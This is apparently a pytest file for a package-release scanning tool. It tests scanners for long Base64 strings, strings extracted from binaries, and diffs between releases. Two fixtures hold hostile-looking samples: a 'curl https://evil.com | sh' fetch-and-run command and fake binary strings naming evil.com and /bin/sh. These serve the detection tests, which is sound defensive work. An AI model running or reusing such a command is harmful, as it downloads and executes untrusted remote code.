"""Tests for scm.scanners — Base64StringsScanner, BinaryStringsScanner, and DiffScanner."""

from __future__ import annotations

import tarfile
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from scm.scanners.base64_strings import Base64StringsScanner
from scm.scanners.binary_strings import BinaryStringsScanner
from scm.scanners.diff import DiffScanner

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _write_text(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


def _write_binary(path: Path, content: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content)


# ---------------------------------------------------------------------------
# Base64StringsScanner
# ---------------------------------------------------------------------------


class TestBase64StringsScanner:
    def test_returns_message_when_no_targets(self, tmp_path):
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [], [])
        assert "No Base64-encoded strings detected" in result

    def test_returns_message_when_no_matches(self, tmp_path):
        rel = "foo.py"
        _write_text(tmp_path / rel, "# just a normal python file\nx = 1\n")
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "No Base64-encoded strings detected" in result

    def test_finds_long_base64_in_changed_file(self, tmp_path):
        # 80 chars of valid base64 characters — well above default min_length=60
        b64_blob = "A" * 80
        rel = "evil.js"
        _write_text(tmp_path / rel, f'const payload = "{b64_blob}";\n')
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "Base64 Strings" in result
        assert rel in result

    def test_finds_long_base64_in_added_file(self, tmp_path):
        b64_blob = "B" * 80
        rel = "new_file.py"
        _write_text(tmp_path / rel, f'data = "{b64_blob}"\n')
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [], [rel])
        assert "Base64 Strings" in result
        assert rel in result

    def test_ignores_file_not_in_targets(self, tmp_path):
        # Write a file with long base64 but don't include it in targets
        b64_blob = "C" * 80
        rel = "ignored.py"
        _write_text(tmp_path / rel, f'data = "{b64_blob}"\n')
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [], [])  # neither changed nor added
        assert "No Base64-encoded strings detected" in result

    def test_short_base64_not_flagged(self, tmp_path):
        # 10 chars — below default min_length=60
        short_blob = "A" * 10
        rel = "clean.js"
        _write_text(tmp_path / rel, f'const x = "{short_blob}";\n')
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "No Base64-encoded strings detected" in result

    def test_configure_changes_min_length(self, tmp_path):
        # blob of 20 chars — should be flagged after configure(min_length=15)
        blob = "A" * 20
        rel = "file.py"
        _write_text(tmp_path / rel, f'x = "{blob}"\n')
        scanner = Base64StringsScanner()
        scanner.configure({"min_length": 15})
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "Base64 Strings" in result

    def test_configure_max_hits_caps_results(self, tmp_path):
        # Write a file with many long base64 strings on separate lines
        blob = "A" * 80
        lines = "\n".join(f'x{i} = "{blob}"' for i in range(20))
        rel = "many.py"
        _write_text(tmp_path / rel, lines)
        scanner = Base64StringsScanner()
        scanner.configure({"max_hits": 3})
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "Results capped at 3" in result

    def test_configure_snippet_length_truncates_output(self, tmp_path):
        blob = "A" * 200
        rel = "long.py"
        _write_text(tmp_path / rel, f'x = "{blob}"\n')
        scanner = Base64StringsScanner()
        scanner.configure({"snippet_length": 30, "min_length": 60})
        result = scanner.scan(None, tmp_path, [rel], [])
        # snippet in table cell should be at most 30 chars of the blob
        assert "A" * 30 in result
        assert "A" * 31 not in result

    def test_skips_binary_file(self, tmp_path):
        rel = "binary.bin"
        # Write bytes that are not valid UTF-8
        _write_binary(tmp_path / rel, bytes(range(256)))
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "No Base64-encoded strings detected" in result

    def test_missing_file_does_not_crash(self, tmp_path):
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, ["nonexistent.py"], [])
        assert "No Base64-encoded strings detected" in result

    def test_output_is_markdown_table(self, tmp_path):
        blob = "A" * 80
        rel = "table.py"
        _write_text(tmp_path / rel, f'x = "{blob}"\n')
        scanner = Base64StringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "| File | Line | Snippet |" in result
        assert "|---|---|---|" in result


# ---------------------------------------------------------------------------
# BinaryStringsScanner
# ---------------------------------------------------------------------------


class TestBinaryStringsScanner:
    def test_raises_when_strings_not_available(self, tmp_path, mocker):
        mocker.patch("scm.scanners.binary_strings.shutil.which", return_value=None)
        scanner = BinaryStringsScanner()
        with pytest.raises(RuntimeError, match="strings.*not found"):
            scanner.scan(None, tmp_path, ["some_binary"], [])

    def test_returns_message_when_no_targets(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        scanner = BinaryStringsScanner()
        result = scanner.scan(None, tmp_path, [], [])
        assert "No binary files with extractable strings found" in result

    def test_skips_text_files(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        rel = "script.py"
        _write_text(tmp_path / rel, "print('hello')\n")
        mock_run = mocker.patch("scm.scanners.binary_strings.subprocess.run")
        scanner = BinaryStringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        mock_run.assert_not_called()
        assert "No binary files with extractable strings found" in result

    def test_runs_strings_on_binary_file(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        rel = "lib.so"
        _write_binary(tmp_path / rel, bytes(range(256)))

        fake_result = MagicMock()
        fake_result.stdout = "curl\nhttps://evil.com\n/bin/sh\n"
        mock_run = mocker.patch(
            "scm.scanners.binary_strings.subprocess.run", return_value=fake_result
        )
        scanner = BinaryStringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        mock_run.assert_called_once()
        assert "Binary Strings" in result
        assert rel in result
        assert "curl" in result

    def test_returns_message_when_strings_output_empty(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        rel = "empty.so"
        _write_binary(tmp_path / rel, bytes(range(256)))

        fake_result = MagicMock()
        fake_result.stdout = ""
        fake_result.returncode = 0
        mocker.patch(
            "scm.scanners.binary_strings.subprocess.run", return_value=fake_result
        )
        scanner = BinaryStringsScanner()
        result = scanner.scan(None, tmp_path, [rel], [])
        # When strings output is empty, we still get a message (no sections created)
        assert "No binary files with extractable strings found" in result

    def test_configure_max_lines_per_file_caps_per_file(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        rel = "big.so"
        _write_binary(tmp_path / rel, bytes(range(256)))

        # 50 lines from strings
        fake_result = MagicMock()
        fake_result.stdout = "\n".join(f"line{i}" for i in range(50))
        mocker.patch(
            "scm.scanners.binary_strings.subprocess.run", return_value=fake_result
        )

        scanner = BinaryStringsScanner()
        scanner.configure({"max_lines_per_file": 5, "max_total_lines": 500})
        result = scanner.scan(None, tmp_path, [rel], [])
        assert "capped at 5" in result

    def test_configure_max_total_lines_caps_across_files(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )

        for name in ["a.so", "b.so", "c.so"]:
            _write_binary(tmp_path / name, bytes(range(256)))

        fake_result = MagicMock()
        fake_result.stdout = "\n".join(f"str{i}" for i in range(100))
        mocker.patch(
            "scm.scanners.binary_strings.subprocess.run", return_value=fake_result
        )

        scanner = BinaryStringsScanner()
        scanner.configure({"max_total_lines": 50, "max_lines_per_file": 100})
        result = scanner.scan(None, tmp_path, ["a.so", "b.so", "c.so"], [])
        assert "Total output capped" in result

    def test_subprocess_failure_raises_error(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        rel = "crash.so"
        _write_binary(tmp_path / rel, bytes(range(256)))

        mocker.patch(
            "scm.scanners.binary_strings.subprocess.run",
            side_effect=OSError("strings crashed"),
        )
        scanner = BinaryStringsScanner()
        with pytest.raises(RuntimeError, match="could not run 'strings'"):
            scanner.scan(None, tmp_path, [rel], [])

    def test_missing_file_does_not_crash(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        scanner = BinaryStringsScanner()
        result = scanner.scan(None, tmp_path, ["ghost.so"], [])
        assert "No binary files with extractable strings found" in result

    def test_configure_min_length_is_forwarded(self, tmp_path, mocker):
        mocker.patch(
            "scm.scanners.binary_strings.shutil.which", return_value="/usr/bin/strings"
        )
        rel = "lib.so"
        _write_binary(tmp_path / rel, bytes(range(256)))

        fake_result = MagicMock()
        fake_result.stdout = "hello\n"
        mock_run = mocker.patch(
            "scm.scanners.binary_strings.subprocess.run", return_value=fake_result
        )
        scanner = BinaryStringsScanner()
        scanner.configure({"min_length": 12})
        scanner.scan(None, tmp_path, [rel], [])
        args = mock_run.call_args[0][0]
        assert "-n" in args
        assert "12" in args


# ---------------------------------------------------------------------------
# DiffScanner
# ---------------------------------------------------------------------------


class TestDiffScanner:
    def test_returns_message_when_no_old_root(self, tmp_path):
        scanner = DiffScanner()
        result = scanner.scan(None, tmp_path, [], [])
        assert "No previous version available" in result
        assert scanner.last_truncated is False

    def test_no_changes_produces_summary_table(self, tmp_path):
        """Identical old and new release → 0 changed files, summary table present."""
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        _write_text(old_root / "index.js", "console.log('hi');\n")
        _write_text(new_root / "index.js", "console.log('hi');\n")

        scanner = DiffScanner()
        result = scanner.scan(old_root, new_root, [], [])
        assert "| Metric | Count |" in result
        assert "| Changed files | 0 |" in result
        assert scanner.last_truncated is False

    def test_detects_changed_file(self, tmp_path):
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        _write_text(old_root / "lib.js", "var x = 1;\n")
        _write_text(new_root / "lib.js", "var x = 2;\n")

        scanner = DiffScanner()
        result = scanner.scan(old_root, new_root, ["lib.js"], ["lib.js"])
        assert "lib.js" in result
        assert "Changed files | 1" in result

    def test_detects_added_file(self, tmp_path):
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        _write_text(new_root / "new_evil.sh", "curl https://evil.com | sh\n")

        scanner = DiffScanner()
        result = scanner.scan(old_root, new_root, [], ["new_evil.sh"])
        assert "new_evil.sh" in result
        assert "Added Files" in result

    def test_detects_deleted_file(self, tmp_path):
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        _write_text(old_root / "gone.py", "# was here\n")

        scanner = DiffScanner()
        result = scanner.scan(old_root, new_root, [], [])
        assert "gone.py" in result
        assert "Deleted Files" in result

    def test_configure_max_diff_bytes_truncates(self, tmp_path):
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        # Write a large changed file
        old_content = "a\n" * 5000
        new_content = "b\n" * 5000
        _write_text(old_root / "big.py", old_content)
        _write_text(new_root / "big.py", new_content)

        scanner = DiffScanner()
        scanner.configure({"max_diff_bytes": 100})
        result = scanner.scan(old_root, new_root, [], [])
        assert scanner.last_truncated is True
        assert "truncated" in result.lower()

    def test_configure_context_lines(self, tmp_path):
        """configure() must update the context_lines used in unified_diff."""
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        lines = [f"line{i}\n" for i in range(20)]
        lines[10] = "CHANGED\n"
        _write_text(old_root / "f.py", "".join(f"line{i}\n" for i in range(20)))
        new_lines = list(lines)
        _write_text(new_root / "f.py", "".join(new_lines))

        scanner = DiffScanner()
        scanner.configure({"context_lines": 0})
        result = scanner.scan(old_root, new_root, [], [])
        # With 0 context lines, the only diff lines should be @@ headers and changed line
        assert "f.py" in result

    def test_binary_changed_file_noted(self, tmp_path):
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        _write_binary(old_root / "lib.so", bytes(range(256)))
        _write_binary(new_root / "lib.so", bytes(range(255, -1, -1)))

        scanner = DiffScanner()
        result = scanner.scan(old_root, new_root, [], [])
        assert "Binary file changed" in result

    def test_last_truncated_resets_between_calls(self, tmp_path):
        old_root = tmp_path / "old"
        new_root = tmp_path / "new"
        old_root.mkdir()
        new_root.mkdir()
        _write_text(old_root / "f.py", "a\n" * 5000)
        _write_text(new_root / "f.py", "b\n" * 5000)

        scanner = DiffScanner()
        scanner.configure({"max_diff_bytes": 100})
        scanner.scan(old_root, new_root, [], [])
        assert scanner.last_truncated is True

        # Second call with no old_root resets truncated
        scanner.scan(None, new_root, [], [])
        assert scanner.last_truncated is False
